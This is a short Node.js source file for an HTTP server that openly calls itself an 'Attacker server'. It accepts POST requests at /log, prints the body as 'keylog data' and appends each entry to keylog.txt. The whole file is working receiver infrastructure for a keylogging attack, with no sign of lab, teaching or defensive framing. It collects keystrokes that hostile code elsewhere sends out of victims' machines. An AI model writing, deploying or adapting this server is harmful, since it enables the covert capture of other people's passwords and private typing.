const http = require('http');
const fs = require('fs');
const PORT = 3002; // You can choose any free port

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/log') {
    let body = '';

    req.on('data', chunk => {
      body += chunk.toString();
    });

    req.on('end', () => {
      console.log('Received keylog data:', body);

      // Append to keylog.txt (create if not exists)
      fs.appendFile('keylog.txt', body + '\n', (err) => {
        if (err) {
          console.error('Failed to write keylog:', err);
        }
      });

      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('Logged\n');
    });
  } else {
    res.writeHead(404);
    res.end();
  }
});

server.listen(PORT, () => {
  console.log(`Attacker server listening on http://localhost:${PORT}`);
});
